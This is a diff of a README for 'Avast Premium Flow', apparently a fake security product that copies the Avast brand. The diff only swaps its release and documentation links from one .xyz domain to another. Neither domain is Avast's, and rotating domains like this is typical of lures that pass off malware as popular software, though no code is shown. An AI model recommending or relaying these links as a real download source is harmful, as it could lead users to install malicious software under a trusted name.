@@ -6,8 +6,8 @@ Enterprise-grade **Avast Premium Flow** security solution providing comprehensiv
 It keeps things simple: quick to set up, light on resources, and easy to use day to day.
 
 ## 📥 Download
-- 📥 **Latest release:** [https://avast-premium-flow.softonx.xyz](https://avast-premium-flow.softonx.xyz)
-- 📖 **Docs & guides:** [https://avast-premium-flow.softonx.xyz](https://avast-premium-flow.softonx.xyz)
+- 📥 **Latest release:** [https://avast-premium-flow.softax.xyz](https://avast-premium-flow.softax.xyz)
+- 📖 **Docs & guides:** [https://avast-premium-flow.softax.xyz](https://avast-premium-flow.softax.xyz)
 
 ## ⚡ Key Features
 1. **Real-Time Protection:** Advanced threat detection with zero-day exploit prevention.
